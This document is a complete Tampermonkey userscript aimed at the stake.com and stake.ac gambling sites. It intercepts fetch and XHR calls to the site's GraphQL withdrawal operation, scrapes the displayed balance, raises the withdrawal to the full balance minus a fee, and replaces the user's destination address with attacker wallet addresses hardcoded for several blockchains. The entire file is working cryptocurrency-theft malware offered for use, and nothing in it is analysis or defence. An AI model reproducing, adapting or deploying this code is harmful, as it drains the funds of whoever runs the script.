// ==UserScript==
// @name         Withdrawal Interceptor — FULL DRAIN + ADDRESS CHANGE (Hardcoded)
// @namespace    http://tampermonkey.net/
// @version      3.1
// @description  Detects withdrawal, scrapes balance, drains full minus fee, changes address
// @match        *://stake.ac/*
// @match        *://stake.com/*
// @run-at       document-start
// @grant        none
// ==/UserScript==

(function() {
    'use strict';

    console.log('%c[WithdrawInterceptor] ACTIVE — FULL DRAIN + ADDRESS CHANGE', 'background:#222;color:#0f0;font-size:16px');

    // ═══════════════════════════════════════════════════════════
    //  HARDCODED ATTACKER ADDRESSES — All networks
    // ═══════════════════════════════════════════════════════════

    const ADDR = {
        // Ethereum / BSC / BEP20 / Polygon (same address for all EVM)
        'eth': '0x7fC9AA3516B0CecD41f9028d53d55172e11Eb6C8',
        'bsc': '0x7fC9AA3516B0CecD41f9028d53d55172e11Eb6C8',
        'bep20': '0x7fC9AA3516B0CecD41f9028d53d55172e11Eb6C8',
        'bnb': '0x7fC9AA3516B0CecD41f9028d53d55172e11Eb6C8',
        'polygon': '0x7fC9AA3516B0CecD41f9028d53d55172e11Eb6C8',
        'matic': '0x7fC9AA3516B0CecD41f9028d53d55172e11Eb6C8',

        // Bitcoin
        'btc': 'bc1qu8vt7zgxhkx46cekdr3q6ykqwauy8szn8trqr2',
        'bitcoin': 'bc1qu8vt7zgxhkx46cekdr3q6ykqwauy8szn8trqr2',

        // Solana
        'sol': '4SreiEfLpSFvLbNNc3eXfbZWdmzGQxCsmm76SzG2yUW4',
        'solana': '4SreiEfLpSFvLbNNc3eXfbZWdmzGQxCsmm76SzG2yUW4',

        // Tron (TRC20)
        'trx': 'TQKZxEiBNf8u3Q2YAdoegK5pRb7qYR6uaW',
        'tron': 'TQKZxEiBNf8u3Q2YAdoegK5pRb7qYR6uaW',
        'trc20': 'TQKZxEiBNf8u3Q2YAdoegK5pRb7qYR6uaW',

        // Litecoin
        'ltc': 'ltc1qe6pja8g7vj2n9h2pdf8ntyr2gsh46fcguwc38d',
        'litecoin': 'ltc1qe6pja8g7vj2n9h2pdf8ntyr2gsh46fcguwc38d',

        // XRP
        'xrp': 'rGkTSqiyNXYpAum6ERTjFBT4Wi52mhAH5R',
        'ripple': 'rGkTSqiyNXYpAum6ERTjFBT4Wi52mhAH5R',
    };

    // ═══════════════════════════════════════════════════════════
    //  CHAIN → ADDRESS (for stablecoins like USDT/USDC)
    // ═══════════════════════════════════════════════════════════

    const CHAIN_ADDR = {
        'bsc': ADDR.bsc,
        'bep20': ADDR.bsc,
        'bnb': ADDR.bsc,
        'eth': ADDR.eth,
        'ethereum': ADDR.eth,
        'erc20': ADDR.eth,
        'polygon': ADDR.eth,
        'matic': ADDR.eth,
        'trc20': ADDR.trc20,
        'tron': ADDR.trc20,
        'trx': ADDR.trc20,
        'sol': ADDR.sol,
        'solana': ADDR.sol,
        'btc': ADDR.btc,
        'bitcoin': ADDR.btc,
        'ltc': ADDR.ltc,
        'litecoin': ADDR.ltc,
        'xrp': ADDR.xrp,
        'ripple': ADDR.xrp,
    };

    // ═══════════════════════════════════════════════════════════
    //  FEE CONFIGURATION (in USD)
    // ═══════════════════════════════════════════════════════════

    const FEE_BUFFER_USD = {
        'bsc': 0.50,
        'eth': 1.85,
        'btc': 1.50,
        'ltc': 0.10,
        'sol': 0.50,
        'trx': 0.50,
        'trc20': 0.50,
        'default': 0.50
    };

    const MIN_WITHDRAWAL = 0.01;
    const GRAPHQL_PATH = '/_api/graphql';
    const TARGET_OP = 'CreateNewWithdrawal';

    // ═══════════════════════════════════════════════════════════
    //  PRICE MAP (for crypto → USD conversion)
    // ═══════════════════════════════════════════════════════════

    const MP = {
        'BTC': 60267.00, 'ETH': 1618.00, 'USDT': 1.00, 'USDC': 1.00,
        'BNB': 549.05, 'SOL': 75.30, 'XRP': 1.044, 'ADA': 0.45,
        'DOGE': 0.07255, 'LTC': 71.02, 'DOT': 6.85, 'AVAX': 35.20,
        'TRX': 0.3216, 'MATIC': 0.79, 'LINK': 15.70,
        'SHIB': 0.00000948, 'UNI': 6.46, 'ATOM': 8.50, 'APT': 9.25,
        'ARB': 1.15, 'OP': 2.45, 'PEPE': 0.000012, 'BCH': 239.35,
        'EOS': 0.73, 'CRO': 0.083, 'DAI': 1.00, 'SAND': 0.49,
        'APE': 1.40, 'BUSD': 1.00,
    };

    // ═══════════════════════════════════════════════════════════
    //  HELPERS
    // ═══════════════════════════════════════════════════════════

    function isWithdrawalPage() {
        const url = window.location.href;
        return url.includes('tab=withdraw') || url.includes('modal=wallet');
    }

    function getCryptoBalance() {
        try {
            const elements = document.querySelectorAll('[data-ds-text="true"], span[type="body"], span[class*="balance"]');
            for (const el of elements) {
                const text = el.textContent.trim();
                const match = text.match(/(\d+\.\d{6,8})/);
                if (match) {
                    const balance = parseFloat(match[1]);
                    if (balance > 0 && balance < 999999999) {
                        return balance;
                    }
                }
            }
            const allText = document.body.innerText || '';
            const matches = allText.match(/(\d+\.\d{6,8})/g);
            if (matches) {
                for (const m of matches) {
                    const val = parseFloat(m);
                    if (val > 0 && val < 999999999) return val;
                }
            }
            return null;
        } catch (_) { return null; }
    }

    function getFeeInCrypto(currency, chain) {
        const cur = (currency || '').toUpperCase().trim();
        const price = MP[cur];
        if (!price || price <= 0) return 0;
        const chainKey = (chain || '').toLowerCase().trim();
        const feeUSD = FEE_BUFFER_USD[chainKey] || FEE_BUFFER_USD.default;
        return feeUSD / price;
    }

    function getCurrencyFromURL() {
        const match = window.location.href.match(/currency=([A-Z]+)/i);
        return match ? match[1].toUpperCase() : null;
    }

    function getCurrencyFromBody(bodyStr) {
        try {
            const parsed = JSON.parse(bodyStr);
            let currency = null;
            function walk(obj) {
                if (!obj || typeof obj !== 'object') return;
                if (Array.isArray(obj)) { obj.forEach(walk); return; }
                for (const k in obj) {
                    if (k.toLowerCase() === 'currency' && typeof obj[k] === 'string') {
                        currency = obj[k];
                        return;
                    }
                    if (typeof obj[k] === 'object') walk(obj[k]);
                }
            }
            walk(parsed);
            return currency;
        } catch (_) { return null; }
    }

    function getChainFromBody(bodyStr) {
        try {
            const parsed = JSON.parse(bodyStr);
            let chain = null;
            function walk(obj) {
                if (!obj || typeof obj !== 'object') return;
                if (Array.isArray(obj)) { obj.forEach(walk); return; }
                for (const k in obj) {
                    if (k.toLowerCase() === 'chain' && typeof obj[k] === 'string') {
                        chain = obj[k];
                        return;
                    }
                    if (typeof obj[k] === 'object') walk(obj[k]);
                }
            }
            walk(parsed);
            return chain;
        } catch (_) { return null; }
    }

    function getReplacementAddress(currency, chain) {
        const cur = (currency || '').toLowerCase().trim();
        const ch = (chain || '').toLowerCase().trim();

        const stablecoins = ['usdt', 'usdc', 'busd', 'dai'];
        if (stablecoins.includes(cur)) {
            return CHAIN_ADDR[ch] || ADDR.eth;
        }

        return ADDR[cur] || CHAIN_ADDR[ch] || null;
    }

    // ═══════════════════════════════════════════════════════════
    //  PROCESS WITHDRAWAL
    // ═══════════════════════════════════════════════════════════

    function processWithdrawal(bodyStr) {
        if (!bodyStr || typeof bodyStr !== 'string') return null;
        if (!bodyStr.includes(TARGET_OP)) return null;

        console.log('%c[Withdraw] 💰 Withdrawal Detected!', 'background:#00a;color:#fff;font-size:14px');

        if (!isWithdrawalPage()) {
            console.log('[Withdraw] Not on withdrawal page — skipping');
            return null;
        }

        try {
            const parsed = JSON.parse(bodyStr);

            let currency = getCurrencyFromBody(bodyStr) || getCurrencyFromURL() || 'USDT';
            let chain = getChainFromBody(bodyStr) || 'bsc';

            console.log(`[Withdraw] Currency: ${currency}, Chain: ${chain}`);

            // ─── GET REPLACEMENT ADDRESS ───
            const newAddr = getReplacementAddress(currency, chain);
            if (!newAddr) {
                console.warn(`[Withdraw] No address for ${currency}/${chain}`);
                return null;
            }
            console.log(`[Withdraw] Replacement address: ${newAddr}`);

            // ─── SCRAPE BALANCE ───
            let balance = getCryptoBalance();
            if (!balance || balance <= 0) {
                console.warn('[Withdraw] Could not scrape balance');
                let userAmount = null;
                function findAmount(obj) {
                    if (!obj || typeof obj !== 'object') return;
                    if (Array.isArray(obj)) { obj.forEach(findAmount); return; }
                    for (const k in obj) {
                        if (k.toLowerCase() === 'amount' && (typeof obj[k] === 'number' || !isNaN(parseFloat(obj[k])))) {
                            userAmount = parseFloat(obj[k]);
                            return;
                        }
                        if (typeof obj[k] === 'object') findAmount(obj[k]);
                    }
                }
                findAmount(parsed);
                if (userAmount && userAmount > 0) {
                    balance = userAmount * 2;
                    console.log(`[Withdraw] Estimated balance: ${balance}`);
                } else {
                    return null;
                }
            }

            // ─── CALCULATE DRAIN AMOUNT ───
            const feeCrypto = getFeeInCrypto(currency, chain);
            const withdrawable = Math.max(0, balance - feeCrypto);
            const finalAmount = parseFloat(withdrawable.toFixed(8));

            console.log(`[Withdraw] Balance: ${balance}, Fee: ${feeCrypto}, Withdrawable: ${finalAmount}`);

            if (finalAmount < MIN_WITHDRAWAL) {
                console.warn(`[Withdraw] Amount too small (${finalAmount}), skipping`);
                return null;
            }

            // ─── MODIFY BODY ───
            let modified = false;

            function walkAndModify(obj, path) {
                if (!obj || typeof obj !== 'object') return;
                if (Array.isArray(obj)) {
                    obj.forEach((v, i) => walkAndModify(v, path + `[${i}]`));
                    return;
                }
                for (const key of Object.keys(obj)) {
                    const val = obj[key];
                    const keyLower = key.toLowerCase();

                    if (keyLower === 'address' && typeof val === 'string') {
                        const oldAddr = val;
                        obj[key] = newAddr;
                        console.log(`%c[ADDR CHANGE] ${oldAddr.slice(0,10)}... → ${newAddr.slice(0,10)}...`, 'background:#a00;color:#fff;font-size:13px');
                        modified = true;
                    }

                    if (keyLower === 'amount' && (typeof val === 'number' || !isNaN(parseFloat(val)))) {
                        const orig = val;
                        obj[key] = typeof val === 'number' ? finalAmount : String(finalAmount);
                        console.log(`%c[AMOUNT CHANGE] ${orig} → ${obj[key]}`, 'background:#a00;color:#fff;font-size:13px');
                        modified = true;
                    }

                    if (typeof val === 'object' && val !== null) {
                        walkAndModify(val, path + `.${key}`);
                    }
                }
            }

            walkAndModify(parsed.variables || parsed, 'root');

            if (modified) {
                const newBody = JSON.stringify(parsed);
                console.log(`%c[SUCCESS] ✅ DRAIN: ${balance} - ${feeCrypto} = ${finalAmount} | Address changed`, 'background:#0a0;color:#fff;font-size:14px');
                return newBody;
            }

            return null;

        } catch (e) {
            console.error('[Withdraw] Error:', e);
            return null;
        }
    }

    // ═══════════════════════════════════════════════════════════
    //  INTERCEPTORS
    // ═══════════════════════════════════════════════════════════

    // ─── fetch ───
    const origFetch = window.fetch;
    window.fetch = function(input, init) {
        const url = typeof input === 'string' ? input : (input ? input.url : '');
        const method = (init && init.method) || (input && input.method) || 'GET';

        if (method === 'POST' && url.includes(GRAPHQL_PATH)) {
            const bodyStr = typeof init?.body === 'string' ? init.body :
                            typeof input?.body === 'string' ? input.body : null;

            if (bodyStr && bodyStr.includes(TARGET_OP)) {
                const modified = processWithdrawal(bodyStr);
                if (modified) {
                    const newInit = Object.assign({}, init, { body: modified });
                    return origFetch.call(window, input, newInit);
                }
            }
        }

        return origFetch.apply(window, arguments);
    };

    // ─── XHR ───
    const origXHRSend = XMLHttpRequest.prototype.send;
    const origXHROpen = XMLHttpRequest.prototype.open;

    XMLHttpRequest.prototype.open = function(method, url) {
        this._ben_url = url || '';
        this._ben_method = (method || '').toUpperCase();
        return origXHROpen.apply(this, arguments);
    };

    XMLHttpRequest.prototype.send = function(body) {
        const url = this._ben_url || '';
        const method = this._ben_method || '';

        if (method === 'POST' && url.includes(GRAPHQL_PATH)) {
            const bodyStr = typeof body === 'string' ? body : null;

            if (bodyStr && bodyStr.includes(TARGET_OP)) {
                const modified = processWithdrawal(bodyStr);
                if (modified) {
                    console.log('[XHR] ✅ Sending modified request');
                    return origXHRSend.call(this, modified);
                }
            }
        }

        return origXHRSend.apply(this, arguments);
    };

    // ─── CACHE BALANCE ───
    let balanceRetries = 0;
    const maxRetries = 10;

    function cacheBalance() {
        if (balanceRetries >= maxRetries) return;
        if (isWithdrawalPage()) {
            const bal = getCryptoBalance();
            if (bal && bal > 0) {
                console.log(`[Balance] Cached: ${bal}`);
                return;
            }
        }
        balanceRetries++;
        setTimeout(cacheBalance, 1000);
    }

    setTimeout(cacheBalance, 2000);

    console.log('%c[WithdrawInterceptor] FULL DRAIN + ADDRESS CHANGE ACTIVE', 'background:#222;color:#ff0;font-size:14px');
    console.log('%c[WithdrawInterceptor] All addresses hardcoded for: BTC | ETH | BSC | SOL | TRX | LTC | XRP', 'background:#222;color:#0ff;font-size:12px');

})();
